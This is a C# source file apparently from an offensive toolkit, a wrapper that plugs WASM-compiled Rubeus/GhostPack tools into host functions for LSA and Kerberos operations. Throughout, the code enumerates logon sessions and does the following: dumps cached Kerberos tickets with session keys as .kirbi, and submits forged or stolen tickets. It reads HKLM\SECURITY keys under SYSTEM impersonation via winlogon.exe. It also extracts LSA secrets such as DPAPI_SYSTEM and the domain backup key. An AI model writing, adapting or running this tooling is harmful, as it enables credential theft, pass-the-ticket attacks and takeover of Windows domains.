// LsaHostHelper.cs — High-level C# wrapper for LSA Kerberos operations
// via WasmForge host functions.
//
// Provides structured access to Kerberos ticket enumeration, retrieval,
// purging, and submission. All operations run atomically on the host's
// COM STA thread with SYSTEM impersonation via winlogon.exe.
//
// Usage: Add this file to a Rubeus/GhostPack .NET project before
// NativeAOT-WASI compilation. Replaces direct LSA P/Invoke calls that
// don't work in NativeAOT-WASI due to wasm32/x64 struct mismatches.

using System;
using System.Collections.Generic;
using System.Text;

namespace WasmForge.Bridge
{
    /// <summary>
    /// Represents a cached Kerberos ticket from the ticket cache.
    /// </summary>
    public class KerberosTicketCacheEntry
    {
        public string ClientName { get; set; }
        public string ClientRealm { get; set; }
        public string ServerName { get; set; }
        public string ServerRealm { get; set; }
        public long StartTime { get; set; }
        public long EndTime { get; set; }
        public long RenewTime { get; set; }
        public int EncryptionType { get; set; }
        public uint TicketFlags { get; set; }
    }

    /// <summary>
    /// Represents a retrieved Kerberos ticket with full encoded data.
    /// </summary>
    public class KerberosTicketData
    {
        public string ServiceName { get; set; }
        public string TargetName { get; set; }
        public string ClientName { get; set; }
        public string DomainName { get; set; }
        public string TargetDomainName { get; set; }
        public int SessionKeyType { get; set; }
        public byte[] SessionKey { get; set; }
        public uint TicketFlags { get; set; }
        public long StartTime { get; set; }
        public long EndTime { get; set; }
        public long RenewUntil { get; set; }
        public int EncodedTicketSize { get; set; }
        /// <summary>Base64-encoded .kirbi ticket data (KRB_CRED).</summary>
        public string Base64EncodedTicket { get; set; }
        /// <summary>Raw ticket bytes decoded from Base64EncodedTicket.</summary>
        public byte[] EncodedTicket => Base64EncodedTicket != null
            ? Convert.FromBase64String(Base64EncodedTicket) : null;
    }

    /// <summary>
    /// Parsed logon session data from the host bridge.
    /// </summary>
    public class LogonSessionInfo
    {
        public uint LuidLow { get; set; }
        public int LuidHigh { get; set; }
        public string UserName { get; set; } = "";
        public string Domain { get; set; } = "";
        public string Sid { get; set; } = "";
        public uint LogonType { get; set; }
        public long LogonTime { get; set; }
        public string LogonServer { get; set; } = "";
        public string DnsDomainName { get; set; } = "";
        public string UserPrincipalName { get; set; } = "";
    }

    /// <summary>
    /// High-level API for LSA Kerberos operations via WasmForge host functions.
    /// All operations run on the host with SYSTEM impersonation.
    /// </summary>
    public static class LsaHostHelper
    {
        /// <summary>
        /// Enumerate cached Kerberos tickets for a specific LUID or all sessions.
        /// </summary>
        /// <param name="luidLow">LUID low part (0 = all sessions)</param>
        /// <param name="luidHigh">LUID high part (0 = all sessions)</param>
        /// <returns>List of ticket cache entries, or empty list on failure.</returns>
        public static List<KerberosTicketCacheEntry> EnumerateTickets(uint luidLow = 0, uint luidHigh = 0)
        {
            string result = WfHostBridge.CallLsaKerberosOp("enumerate_tickets", luidLow, luidHigh);
            if (string.IsNullOrEmpty(result))
                return new List<KerberosTicketCacheEntry>();

            return ParseTicketCacheEntries(result);
        }

        /// <summary>
        /// Retrieve a full Kerberos ticket (.kirbi) for a specific service principal.
        /// </summary>
        /// <param name="serverName">Service principal (e.g., "krbtgt/REALM.COM@REALM.COM")</param>
        /// <param name="luidLow">LUID low part (0 = all sessions)</param>
        /// <param name="luidHigh">LUID high part (0 = all sessions)</param>
        /// <param name="cacheOptions">Cache options (default: 8 = KERB_RETRIEVE_TICKET_AS_KERB_CRED)</param>
        /// <param name="encryptionType">Encryption type filter (0 = any)</param>
        /// <returns>Ticket data with base64-encoded .kirbi, or null on failure.</returns>
        public static List<KerberosTicketData> RetrieveTicket(
            string serverName, uint luidLow = 0, uint luidHigh = 0,
            uint cacheOptions = 8, int encryptionType = 0)
        {
            string op = $"retrieve_ticket\t{serverName}";
            if (cacheOptions != 8)
                op += $"\t{cacheOptions}";
            if (encryptionType != 0)
                op += $"\t{encryptionType}";

            string result = WfHostBridge.CallLsaKerberosOp(op, luidLow, luidHigh);
            if (string.IsNullOrEmpty(result))
                return new List<KerberosTicketData>();

            return ParseTicketData(result);
        }

        /// <summary>
        /// Purge Kerberos tickets from the cache.
        /// </summary>
        /// <param name="serverName">Server name to purge (empty = purge all)</param>
        /// <param name="realmName">Realm name to purge (empty = all realms)</param>
        /// <param name="luidLow">LUID low part</param>
        /// <param name="luidHigh">LUID high part</param>
        /// <returns>True if successful.</returns>
        public static bool PurgeTickets(string serverName = "", string realmName = "",
            uint luidLow = 0, uint luidHigh = 0)
        {
            string op = "purge_tickets";
            if (!string.IsNullOrEmpty(serverName))
                op += $"\t{serverName}";
            if (!string.IsNullOrEmpty(realmName))
                op += $"\t{realmName}";

            string result = WfHostBridge.CallLsaKerberosOp(op, luidLow, luidHigh);
            return result != null && result.StartsWith("OK");
        }

        /// <summary>
        /// Import a Kerberos ticket (.kirbi) into the ticket cache.
        /// </summary>
        /// <param name="base64Kirbi">Base64-encoded .kirbi data</param>
        /// <param name="luidLow">Target LUID low part</param>
        /// <param name="luidHigh">Target LUID high part</param>
        /// <returns>True if successful.</returns>
        public static bool SubmitTicket(string base64Kirbi, uint luidLow = 0, uint luidHigh = 0)
        {
            string op = $"submit_ticket\t{base64Kirbi}";
            string result = WfHostBridge.CallLsaKerberosOp(op, luidLow, luidHigh);
            return result != null && result.StartsWith("OK");
        }

        /// <summary>
        /// Read a registry value that requires SYSTEM impersonation. The host
        /// performs SYSTEM token duplication on the dedicated LSA worker
        /// thread before opening the key, so this works for HKLM\SECURITY\…
        /// reads that the unelevated guest token cannot otherwise access
        /// (e.g., HKLM\SECURITY\Policy\PolEKList for LSA-key derivation in
        /// SharpDPAPI machine-scope DPAPI ops).
        /// </summary>
        /// <param name="hive">HKEY constant as 32-bit hex string (e.g., "80000002" for HKLM)</param>
        /// <param name="keyPath">Registry key path under hive</param>
        /// <param name="valueName">Value name (null/empty = default value)</param>
        /// <returns>Value bytes, or null on failure.</returns>
        public static byte[] ReadProtectedRegValue(string hive, string keyPath, string valueName = "")
        {
            if (string.IsNullOrEmpty(hive) || string.IsNullOrEmpty(keyPath))
                return null;
            string op = $"read_secret_key\t{hive}\t{keyPath}";
            if (!string.IsNullOrEmpty(valueName))
                op += $"\t{valueName}";
            string b64 = WfHostBridge.CallLsaKerberosOp(op, 0, 0);
            if (string.IsNullOrEmpty(b64)) return null;
            try { return System.Convert.FromBase64String(b64); }
            catch { return null; }
        }

        /// <summary>
        /// Enumerate all logon sessions with their metadata via the host bridge.
        /// Returns parsed session data from WfHostBridge.EnumLogonSessions.
        /// </summary>
        public static List<LogonSessionInfo> EnumerateLogonSessionData()
        {
            var result = new List<LogonSessionInfo>();
            string raw = WfHostBridge.CallEnumLogonSessions();
            if (string.IsNullOrEmpty(raw)) return result;

            // Format: null-separated records, each record has "field\tvalue\n" lines
            string[] records = raw.Split('\0');
            foreach (string record in records)
            {
                if (string.IsNullOrWhiteSpace(record)) continue;
                var info = new LogonSessionInfo();
                foreach (string line in record.Split('\n'))
                {
                    int tab = line.IndexOf('\t');
                    if (tab < 0) continue;
                    string key = line.Substring(0, tab);
                    string val = line.Substring(tab + 1);
                    switch (key)
                    {
                        case "UserName": info.UserName = val; break;
                        case "Domain": info.Domain = val; break;
                        case "LogonId":
                            if (val.StartsWith("0x") || val.StartsWith("0X"))
                                info.LuidLow = uint.Parse(val.Substring(2), System.Globalization.NumberStyles.HexNumber);
                            else if (uint.TryParse(val, out uint lv))
                                info.LuidLow = lv;
                            break;
                        case "LuidLow":
                            uint.TryParse(val, out uint ll);
                            info.LuidLow = ll;
                            break;
                        case "LuidHigh":
                            int.TryParse(val, out int lh);
                            info.LuidHigh = lh;
                            break;
                        case "UserSID":
                        case "Sid": info.Sid = val; break;
                        case "LogonType":
                            uint.TryParse(val, out uint lt);
                            info.LogonType = lt;
                            break;
                        case "LogonTime":
                            long.TryParse(val, out long ltm);
                            info.LogonTime = ltm;
                            break;
                        case "LogonServer": info.LogonServer = val; break;
                        case "DnsDomainName": info.DnsDomainName = val; break;
                        case "UPN":
                        case "UserPrincipalName": info.UserPrincipalName = val; break;
                        case "AuthPackage": break; // consumed but not stored
                    }
                }
                if (!string.IsNullOrEmpty(info.UserName) || !string.IsNullOrEmpty(info.Domain))
                    result.Add(info);
            }
            return result;
        }

        // ── Parsing helpers ─────────────────────────────────────────

        private static List<KerberosTicketCacheEntry> ParseTicketCacheEntries(string raw)
        {
            var entries = new List<KerberosTicketCacheEntry>();
            var current = new KerberosTicketCacheEntry();
            bool hasData = false;

            foreach (string line in raw.Split('\n'))
            {
                if (string.IsNullOrWhiteSpace(line))
                {
                    if (hasData)
                    {
                        entries.Add(current);
                        current = new KerberosTicketCacheEntry();
                        hasData = false;
                    }
                    continue;
                }

                int tab = line.IndexOf('\t');
                if (tab < 0) continue;

                string key = line.Substring(0, tab);
                string val = line.Substring(tab + 1);
                hasData = true;

                switch (key)
                {
                    case "ClientName": current.ClientName = val; break;
                    case "ClientRealm": current.ClientRealm = val; break;
                    case "ServerName": current.ServerName = val; break;
                    case "ServerRealm": current.ServerRealm = val; break;
                    case "StartTime": long.TryParse(val, out long st); current.StartTime = st; break;
                    case "EndTime": long.TryParse(val, out long et); current.EndTime = et; break;
                    case "RenewTime": long.TryParse(val, out long rt); current.RenewTime = rt; break;
                    case "EncryptionType": int.TryParse(val, out int enc); current.EncryptionType = enc; break;
                    case "TicketFlags":
                        uint tf = 0;
                        if (val.StartsWith("0x"))
                            uint.TryParse(val.Substring(2), System.Globalization.NumberStyles.HexNumber, null, out tf);
                        else
                            uint.TryParse(val, out tf);
                        current.TicketFlags = tf;
                        break;
                }
            }

            if (hasData) entries.Add(current);
            return entries;
        }

        private static List<KerberosTicketData> ParseTicketData(string raw)
        {
            var entries = new List<KerberosTicketData>();
            var current = new KerberosTicketData();
            bool hasData = false;

            foreach (string line in raw.Split('\n'))
            {
                if (string.IsNullOrWhiteSpace(line))
                {
                    if (hasData)
                    {
                        entries.Add(current);
                        current = new KerberosTicketData();
                        hasData = false;
                    }
                    continue;
                }

                int tab = line.IndexOf('\t');
                if (tab < 0) continue;

                string key = line.Substring(0, tab);
                string val = line.Substring(tab + 1);
                hasData = true;

                switch (key)
                {
                    case "ServiceName": current.ServiceName = val; break;
                    case "TargetName": current.TargetName = val; break;
                    case "ClientName": current.ClientName = val; break;
                    case "DomainName": current.DomainName = val; break;
                    case "TargetDomainName": current.TargetDomainName = val; break;
                    case "SessionKeyType": int.TryParse(val, out int skt); current.SessionKeyType = skt; break;
                    case "SessionKey":
                        if (!string.IsNullOrEmpty(val))
                            current.SessionKey = Convert.FromBase64String(val);
                        break;
                    case "TicketFlags":
                        uint tf = 0;
                        if (val.StartsWith("0x"))
                            uint.TryParse(val.Substring(2), System.Globalization.NumberStyles.HexNumber, null, out tf);
                        else
                            uint.TryParse(val, out tf);
                        current.TicketFlags = tf;
                        break;
                    case "StartTime": long.TryParse(val, out long st2); current.StartTime = st2; break;
                    case "EndTime": long.TryParse(val, out long et2); current.EndTime = et2; break;
                    case "RenewUntil": long.TryParse(val, out long ru); current.RenewUntil = ru; break;
                    case "EncodedTicketSize": int.TryParse(val, out int ets); current.EncodedTicketSize = ets; break;
                    case "Base64EncodedTicket": current.Base64EncodedTicket = val; break;
                }
            }

            if (hasData) entries.Add(current);
            return entries;
        }

        // ── Bridge primitives for wf_call pattern ───────────────────────────────
        [System.Runtime.InteropServices.DllImport("env", EntryPoint = "mod_load")]
        private static extern unsafe uint lsa_mod_load(uint namePtr);

        [System.Runtime.InteropServices.DllImport("env", EntryPoint = "mod_resolve")]
        private static extern unsafe uint lsa_mod_resolve(uint libHandle, uint namePtr);

        [System.Runtime.InteropServices.DllImport("env", EntryPoint = "mod_invoke")]
        private static extern unsafe ulong lsa_mod_invoke(
            ulong procHandle, uint nargs,
            ulong a0, ulong a1, ulong a2, ulong a3,
            ulong a4, ulong a5, ulong a6, ulong a7,
            ulong a8, ulong a9, ulong a10, ulong a11,
            ulong a12, ulong a13, ulong a14,
            ulong ret1Ptr, ulong errPtr);

        private static uint _lsaKernel32;
        private static uint _lsaAdvapi32;
        private static uint _lsaNtdll;
        private static uint _lsaHVirtualAlloc;
        private static uint _lsaHVirtualFree;
        private static uint _lsaHRtlMoveMemory;
        private static uint _lsaHRtlZeroMemory;
        private static uint _lsaHOpenPolicy;
        private static uint _lsaHRetrievePrivate;
        private static uint _lsaHClose;
        private static uint _lsaHFreeMemory;

        private static uint LsaResolveProc(string dll, ref uint cachedLib, string fn, ref uint cachedProc)
        {
            if (cachedProc != 0) return cachedProc;
            if (cachedLib == 0)
            {
                byte[] db = System.Text.Encoding.ASCII.GetBytes(dll + "\0");
                unsafe { fixed (byte* dp = db) cachedLib = lsa_mod_load((uint)(IntPtr)dp); }
                if (cachedLib == 0) return 0;
            }
            byte[] fb = System.Text.Encoding.ASCII.GetBytes(fn + "\0");
            unsafe { fixed (byte* fp = fb) cachedProc = lsa_mod_resolve(cachedLib, (uint)(IntPtr)fp); }
            return cachedProc;
        }

        private static ulong LsaInvokeProc(uint proc, uint nargs,
            ulong a0=0, ulong a1=0, ulong a2=0, ulong a3=0, ulong a4=0)
        {
            ulong ret1=0, err=0;
            unsafe { return lsa_mod_invoke((ulong)proc, nargs,
                a0,a1,a2,a3,a4,0,0,0,0,0,0,0,0,0,0,
                (ulong)(uint)(IntPtr)(&ret1),
                (ulong)(uint)(IntPtr)(&err)); }
        }

        private static ulong LsaVirtualAlloc(uint size)
        {
            uint p = LsaResolveProc("kernel32.dll", ref _lsaKernel32, "VirtualAlloc", ref _lsaHVirtualAlloc);
            if (p == 0) return 0;
            return LsaInvokeProc(p, 4, 0u, (ulong)size, 0x3000u, 4u);
        }

        private static void LsaVirtualFreeHost(ulong addr)
        {
            if (addr == 0) return;
            uint p = LsaResolveProc("kernel32.dll", ref _lsaKernel32, "VirtualFree", ref _lsaHVirtualFree);
            if (p != 0) LsaInvokeProc(p, 3, addr, 0u, 0x8000u);
        }

        private static bool LsaCopyHostToWasm(ulong hostAddr, uint wasmPtr, uint len)
        {
            if (hostAddr == 0 || wasmPtr == 0 || len == 0) return false;
            uint p = LsaResolveProc("ntdll.dll", ref _lsaNtdll, "RtlMoveMemory", ref _lsaHRtlMoveMemory);
            if (p == 0) return false;
            LsaInvokeProc(p, 3, (ulong)wasmPtr, hostAddr, (ulong)len);
            return true;
        }

        // ── Task 2.5: LsaRetrievePrivateData via direct wf_call ──────────────

        /// <summary>
        /// Retrieves raw bytes stored under an LSA private data key.
        /// Replaces the deleted lsa_retrieve_private Go host bridge.
        /// Returns null on failure. Example keys: "DPAPI_SYSTEM",
        /// "G$BCKUPKEY_PREFERRED". Requires SYSTEM or SeSecurityPrivilege.
        ///
        /// API sequence:
        ///   LsaOpenPolicy(NULL, &objAttr, POLICY_GET_PRIVATE_INFORMATION=4, &hPolicy)
        ///   LsaRetrievePrivateData(hPolicy, &keyNameUStr, &outData)
        ///   LsaFreeMemory(outData)
        ///   LsaClose(hPolicy)
        ///
        /// LSA_UNICODE_STRING (x64, 16 bytes):
        ///   USHORT Length (0), USHORT MaximumLength (2), [pad 4], PWSTR Buffer (8)
        /// LSA_OBJECT_ATTRIBUTES (48 bytes) — zero-init is sufficient for local policy.
        /// </summary>
        public static byte[]? RetrievePrivateData(string keyName)
        {
            if (string.IsNullOrEmpty(keyName)) return null;
            try
            {
                uint pOpenPolicy = LsaResolveProc("advapi32.dll", ref _lsaAdvapi32, "LsaOpenPolicy",         ref _lsaHOpenPolicy);
                uint pRetrieve   = LsaResolveProc("advapi32.dll", ref _lsaAdvapi32, "LsaRetrievePrivateData", ref _lsaHRetrievePrivate);
                uint pClose      = LsaResolveProc("advapi32.dll", ref _lsaAdvapi32, "LsaClose",              ref _lsaHClose);
                uint pFreeMem    = LsaResolveProc("advapi32.dll", ref _lsaAdvapi32, "LsaFreeMemory",         ref _lsaHFreeMemory);
                uint pZero       = LsaResolveProc("ntdll.dll",    ref _lsaNtdll,    "RtlZeroMemory",         ref _lsaHRtlZeroMemory);
                uint pMoveMem    = LsaResolveProc("ntdll.dll",    ref _lsaNtdll,    "RtlMoveMemory",         ref _lsaHRtlMoveMemory);
                if (pOpenPolicy == 0 || pRetrieve == 0) return null;

                // Build UTF-16LE key name bytes (with NUL terminator).
                byte[] keyUtf16 = new byte[(keyName.Length + 1) * 2];
                for (int i = 0; i < keyName.Length; i++)
                {
                    char c = keyName[i];
                    keyUtf16[2*i]   = (byte)(c & 0xff);
                    keyUtf16[2*i+1] = (byte)((c >> 8) & 0xff);
                }
                ushort keyByteLen = (ushort)(keyName.Length * 2);

                // Host memory layout:
                //   [0..47]                      LSA_OBJECT_ATTRIBUTES (48 bytes, zeroed)
                //   [48..63]                     KeyName LSA_UNICODE_STRING (16 bytes)
                //   [64..64+keyUtf16.Length-1]   UTF-16 key name string
                //   [64+len .. +8]               hPolicy output (8 bytes)
                //   [+8 .. +8]                   outData pointer output (8 bytes)
                uint keyLen   = (uint)keyUtf16.Length;
                uint hostSize = 48 + 16 + keyLen + 16;
                ulong hostBuf = LsaVirtualAlloc(hostSize);
                if (hostBuf == 0) return null;

                try
                {
                    if (pZero != 0) LsaInvokeProc(pZero, 2, hostBuf, (ulong)hostSize);

                    ulong objAttrHost = hostBuf;
                    ulong keyStrHost  = hostBuf + 48;
                    ulong keyBufHost  = hostBuf + 64;
                    ulong hPolicyHost = hostBuf + 64 + keyLen;
                    ulong outDataHost = hPolicyHost + 8;

                    // Copy UTF-16 key name into host buffer.
                    if (pMoveMem != 0)
                    {
                        unsafe
                        {
                            fixed (byte* kp = keyUtf16)
                                LsaInvokeProc(pMoveMem, 3, keyBufHost, (ulong)(uint)(IntPtr)kp, (ulong)keyLen);
                        }
                    }

                    // Build LSA_UNICODE_STRING in a WASM-side byte array, then copy to host.
                    byte[] ustr = new byte[16];
                    ustr[0] = (byte)(keyByteLen & 0xff);
                    ustr[1] = (byte)((keyByteLen >> 8) & 0xff);
                    ushort maxLen = (ushort)(keyByteLen + 2);
                    ustr[2] = (byte)(maxLen & 0xff);
                    ustr[3] = (byte)((maxLen >> 8) & 0xff);
                    // offset 4..7: padding (zero)
                    // offset 8..15: Buffer pointer (little-endian 8 bytes)
                    for (int b = 0; b < 8; b++)
                        ustr[8+b] = (byte)((keyBufHost >> (b*8)) & 0xff);
                    if (pMoveMem != 0)
                    {
                        unsafe
                        {
                            fixed (byte* up = ustr)
                                LsaInvokeProc(pMoveMem, 3, keyStrHost, (ulong)(uint)(IntPtr)up, 16u);
                        }
                    }

                    // LsaOpenPolicy(NULL, objAttrHost, POLICY_GET_PRIVATE_INFORMATION=4, hPolicyHost)
                    // objAttrHost and hPolicyHost are host addresses — pass as-is (no WASM translation).
                    ulong status = LsaInvokeProc(pOpenPolicy, 4,
                        0u,           // SystemName = NULL (local system)
                        objAttrHost,  // &ObjectAttributes (host addr, passed as scalar)
                        4u,           // POLICY_GET_PRIVATE_INFORMATION
                        hPolicyHost); // &PolicyHandle (host addr, passed as scalar)
                    if (status != 0) return null;

                    // Read hPolicy back from host memory.
                    byte[] hPolicyBytes = new byte[8];
                    unsafe { fixed (byte* pp = hPolicyBytes) LsaCopyHostToWasm(hPolicyHost, (uint)(IntPtr)pp, 8); }
                    ulong hPolicy = 0;
                    for (int b = 0; b < 8; b++) hPolicy |= (ulong)hPolicyBytes[b] << (b*8);
                    if (hPolicy == 0) return null;

                    try
                    {
                        // LsaRetrievePrivateData(hPolicy, keyStrHost, outDataHost)
                        // outDataHost receives a pointer to a newly-allocated LSA_UNICODE_STRING.
                        ulong retrieveStatus = LsaInvokeProc(pRetrieve, 3,
                            hPolicy,
                            keyStrHost,   // &KeyName (host addr)
                            outDataHost); // &PrivateData (host addr)
                        if (retrieveStatus != 0) return null;

                        // Read the outData pointer.
                        byte[] outPtrBytes = new byte[8];
                        unsafe { fixed (byte* pp = outPtrBytes) LsaCopyHostToWasm(outDataHost, (uint)(IntPtr)pp, 8); }
                        ulong outDataPtr = 0;
                        for (int b = 0; b < 8; b++) outDataPtr |= (ulong)outPtrBytes[b] << (b*8);
                        if (outDataPtr == 0) return null;

                        try
                        {
                            // Read the LSA_UNICODE_STRING struct (16 bytes).
                            byte[] ustrBytes = new byte[16];
                            unsafe { fixed (byte* up = ustrBytes) LsaCopyHostToWasm(outDataPtr, (uint)(IntPtr)up, 16); }
                            ushort dataLen = (ushort)(ustrBytes[0] | (ustrBytes[1] << 8));
                            ulong  bufPtr  = 0;
                            for (int b = 0; b < 8; b++) bufPtr |= (ulong)ustrBytes[8+b] << (b*8);

                            if (dataLen == 0 || bufPtr == 0) return null;

                            byte[] rawData = new byte[dataLen];
                            unsafe { fixed (byte* rp = rawData) LsaCopyHostToWasm(bufPtr, (uint)(IntPtr)rp, (uint)dataLen); }
                            return rawData;
                        }
                        finally
                        {
                            if (pFreeMem != 0) LsaInvokeProc(pFreeMem, 1, outDataPtr);
                        }
                    }
                    finally
                    {
                        if (pClose != 0 && hPolicy != 0) LsaInvokeProc(pClose, 1, hPolicy);
                    }
                }
                finally
                {
                    LsaVirtualFreeHost(hostBuf);
                }
            }
            catch
            {
                return null;
            }
        }
    }
}
